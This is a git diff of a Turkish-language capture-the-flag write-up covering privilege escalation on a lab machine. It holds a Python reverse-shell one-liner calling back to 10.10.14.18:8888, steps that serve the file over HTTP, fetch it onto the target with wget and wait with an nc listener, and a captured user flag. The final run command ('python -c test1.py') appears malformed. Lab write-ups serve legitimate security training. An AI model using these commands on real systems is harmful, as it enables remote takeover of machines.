@@ -56,21 +56,40 @@ nc -nvlp 1234
 
 User Flag: 2c281f318555dbc1b856957c7147bfc1
 
+Scriptmanager kullanıcısı olarak devam ediyorum.
+
 ```console
 sudo -i -u scriptmanager
 ```
 
+Aşağıdaki şekilde betiği düzenledim.
 ```console
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
 
-test1.py olarak kendi localimde kaydedip hedef makinaya dosyayı indirdim.
+test1.py olarak kendi localimde kaydedip sunucu olarak 8000 portundan ayağa  kaldırıyorum. 
 
+```console
 python -m SimpleHTTPServer    
+```
 
+Hedef makinaya dosyayı indirdim.
+
+```console
 wget http://10.10.14.18:8000/test1.py
+```
 
+Reverse shell alabilecek miyiz dinlemeye başlayalım.
+
+```console
 nc -nvlp 8888
+```
+
+Çalıştıralım!
+
+```console
+python -c test1.py
+```
 
 
 ![image](./assets/7.PNG)
